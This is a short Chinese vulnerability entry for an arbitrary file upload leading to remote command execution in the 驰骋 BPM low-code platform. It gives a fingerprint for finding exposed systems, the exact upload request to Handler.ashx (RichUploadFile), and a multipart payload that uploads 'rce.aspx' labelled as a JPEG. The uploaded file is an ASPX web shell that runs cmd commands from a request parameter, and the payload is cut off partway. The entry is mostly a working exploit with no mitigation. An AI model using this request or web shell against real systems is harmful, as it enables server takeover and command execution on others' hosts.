# 驰骋BPM低代码开发平台RichUploadFile存在文件上传致RCE漏洞

- **系统**：驰骋BPM低代码开发平台　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/WF/AppClassic/Home.htm"`
- **请求**：`POST /WF/Comm/Handler.ashx?DoType=HttpHandler&DoMethod=RichUploadFile&HttpHandlerName=BP.WF.HttpHandler.WF_Comm_Sys&Directory=Mazi HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlA…`

**请求体 / payload**
```
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="edit"; filename="rce.aspx"
Content-Type: image/jpeg
<%@ Page Language="Jscript" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
c.Arguments="/c " + Request.Item["cmd"];
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
e.Close();
Response.Write(out.ReadToEnd() + EI.ReadToEnd());
Sys…（脚本共 760 字，完整版见原文）
```
- **预期**：200　|　—